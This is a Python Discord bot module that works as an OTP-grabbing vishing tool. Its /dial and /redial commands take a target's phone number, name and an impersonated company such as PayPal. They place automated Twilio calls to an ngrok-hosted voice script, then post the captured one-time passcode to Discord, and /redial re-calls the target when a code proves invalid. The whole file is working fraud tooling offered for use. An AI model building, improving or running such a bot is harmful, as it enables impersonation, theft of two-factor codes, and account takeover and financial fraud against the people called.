import asyncio
import discord
from discord import app_commands
from discord.ext import commands
import config


class OTP(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.resp = {
            "failed": "Call failed",
            "no-answer": "Call was not answered",
            "cancelled": "Call was cancelled by the client",
            "busy": "User busy this call",
        }

    @commands.command()
    async def sync(self, ctx):
        await self.bot.tree.sync(guild=discord.Object(id=config.GUILD))
        await ctx.send("Done")

    @app_commands.command(
        name="dial", description="This is command to start making calls"
    )
    @app_commands.guilds(discord.Object(id=config.GUILD))
    @app_commands.describe(
        cell_phone="Add +1 E.G +1987654321",
        otp_digits="E.G 8, 6 or 4",
        client_name="E.G Smith",
        company_name="E.G PayPal",
    )
    async def dial(
        self,
        interaction: discord.Interaction,
        cell_phone: str,
        otp_digits: int,
        client_name: str,
        company_name: str,
    ):
        msg = await interaction.response.send_message("Call Initiated")
        client = self.bot.client

        with open("Details/Digits.txt", "w") as f:
            f.write(str(otp_digits))
        with open("Details/Client_name.txt", "w") as f:
            f.write(client_name)
        with open("Details/Company Name.txt", "w") as f:
            f.write(str(company_name))
        call = client.calls.create(
            url=f"{config.NGROK}/voice", to=cell_phone, from_=config.TWILIO_NUMBER
        )
        sid = call.sid
        status = {
            "called": False,
            "ringing": False,
            "in-progress": False,
            "completed": False,
        }
        while True:
            if client.calls(sid).fetch().status == "queued" and not status["called"]:
                await interaction.edit_original_response(
                    embed=discord.Embed(
                        description="Call Is Placed", color=discord.Colour.yellow()
                    )
                )
                status["called"] = True
            elif (
                client.calls(sid).fetch().status == "ringing" and not status["ringing"]
            ):
                await interaction.edit_original_response(
                    embed=discord.Embed(
                        description="Cell Phone Is Ringing",
                        color=discord.Colour.yellow(),
                    )
                )
                status["ringing"] = True
            elif (
                client.calls(sid).fetch().status == "in-progress"
                and not status["in-progress"]
            ):
                await interaction.edit_original_response(
                    embed=discord.Embed(
                        description="Call In Progress",
                        color=discord.Colour.yellow(),
                    )
                )
            elif client.calls(sid).fetch().status == "completed":
                await interaction.edit_original_response(
                    embed=discord.Embed(
                        description="Call Successfully Completed",
                        color=discord.Colour.yellow(),
                    )
                )
                break
            elif client.calls(sid).fetch().status in [
                "failed",
                "no-answer",
                "cancelled",
                "busy",
            ]:
                await interaction.edit_original_response(
                    embed=discord.Embed(
                        description=self.resp[client.calls(sid).fetch().status],
                        color=discord.Colour.red(),
                    )
                )
                break
            await asyncio.sleep(1)

        call = client.calls(sid).fetch()
        with open("grabbed_otp.txt", "r") as f:
            otp = f.read()
        if otp == "":
            await interaction.edit_original_response(
                embed=discord.Embed(
                    description=f"Unable To Grab OTP\n\n\nPrice : {call.price}\nDuration : {call.duration} secs",
                    colour=discord.Colour.red()
                )
            )
        else:
            await interaction.edit_original_response(
                embed=discord.Embed(
                    title="Just a Normal Bot",
                    description=f"{otp}\n\n\n\nPrice : {call.price}\nDuration : {call.duration} secs",
                    color=discord.Colour.green(),
                )
            )
        open("grabbed_otp.txt", "w").close()

    @app_commands.command(
        name="redial", description="If the OTP code supplied is not valid",
    )
    @app_commands.guilds(discord.Object(id=config.GUILD))
    @app_commands.describe(
        cell_phone="Add +1 E.G +1987654321",
        otp_digits="E.G 8, 6 or 4",
        client_name="E.G Smith",
        company_name="E.G PayPal",
    )
    async def redial(
        self,
        interaction: discord.Interaction,
        cell_phone: str,
        otp_digits: int,
        client_name: str,
        company_name: str,
    ):
        await interaction.response.send_message("Call Initiated")
        client = self.bot.client

        with open("Details/Digits.txt", "w") as f:
            f.write(str(otp_digits))
        with open("Details/Client_name.txt", "w") as f:
            f.write(client_name)
        with open("Details/Company Name.txt", "w") as f:
            f.write(str(company_name))
        call = client.calls.create(
            url=f"{config.NGROK}/voiceagain", to=cell_phone, from_=config.TWILIO_NUMBER
        )
        sid = call.sid
        status = {
            "called": False,
            "ringing": False,
            "in-progress": False,
            "completed": False,
        }
        while True:
            if client.calls(sid).fetch().status == "queued" and not status["called"]:
                await interaction.edit_original_response(
                    embed=discord.Embed(
                        description="Call Is Placed", color=discord.Colour.yellow()
                    )
                )
                status["called"] = True
            elif (
                client.calls(sid).fetch().status == "ringing" and not status["ringing"]
            ):
                await interaction.edit_original_response(
                    embed=discord.Embed(
                        description="Cell Phone Is Ringing",
                        color=discord.Colour.yellow(),
                    )
                )
                status["ringing"] = True
            elif (
                client.calls(sid).fetch().status == "in-progress"
                and not status["in-progress"]
            ):
                await interaction.edit_original_response(
                    embed=discord.Embed(
                        description="Call In Progress",
                        color=discord.Colour.yellow(),
                    )
                )
            elif client.calls(sid).fetch().status == "completed":
                await interaction.edit_original_response(
                    embed=discord.Embed(
                        description="Call Successfully Completed",
                        color=discord.Colour.yellow(),
                    )
                )
                break
            elif client.calls(sid).fetch().status in [
                "failed",
                "no-answer",
                "cancelled",
                "busy",
            ]:
                await interaction.edit_original_response(
                    embed=discord.Embed(
                        description=self.resp[client.calls(sid).fetch().status],
                        color=discord.Colour.red(),
                    )
                )
                break
            await asyncio.sleep(1)

        call = client.calls(sid).fetch()
        with open("grabbed_otp.txt", "r") as f:
            otp = f.read()
        if otp == "":
            await interaction.edit_original_response(
                embed=discord.Embed(
                    description=f"Unable To Grab OTP\n\n\nPrice : {call.price}\nDuration : {call.duration} secs",
                    colour=discord.Colour.red()
                )
            )
        else:
            await interaction.edit_original_response(
                embed=discord.Embed(
                    title="Just a Normal Bot",
                    description=f"{otp}\n\n\n\nPrice : {call.price}\nDuration : {call.duration} secs",
                    color=discord.Colour.green(),
                )
            )
        open("grabbed_otp.txt", "w").close()


async def setup(bot: commands.Bot) -> None:
    await bot.add_cog(OTP(bot))
